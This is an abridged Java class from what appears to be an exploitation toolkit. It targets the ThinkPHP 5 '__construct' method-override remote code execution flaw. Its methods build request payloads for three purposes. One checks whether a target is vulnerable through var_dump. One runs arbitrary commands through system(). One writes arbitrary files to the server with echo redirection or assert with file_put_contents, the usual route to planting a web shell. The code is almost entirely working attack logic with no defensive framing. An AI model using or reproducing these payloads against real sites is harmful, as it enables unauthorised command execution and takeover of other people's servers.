...
public class TP5_construct_code_exec_1 implements ExploitInterface {
    ...
    public String  checkVul(String url) {
        ...
        String payload = "_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=dylan";
    ...
    public String exeCmd(String cmd, String encoding) {
        ...
        String payload = "_method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=" + cmd;
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
    ...
    public String uploadFile(String fileContent, String fileName, String platform) throws Exception {
        ...
        try {
            String payload2 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '" + URLEncoder.encode(fileContent.replace("'", "\""), "UTF-8") + "' >" + fileName;
            String payload3 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo \"" + URLEncoder.encode(fileContent.replace("\"", "'"), "UTF-8") + "\" >" + fileName;
            ...
            String payload1 = "_method=__construct&filter[]=assert&method=GET&server[REQUEST_METHOD]=file_put_contents('" + fileName + "',base64_decode('" + fileContent + "'))";
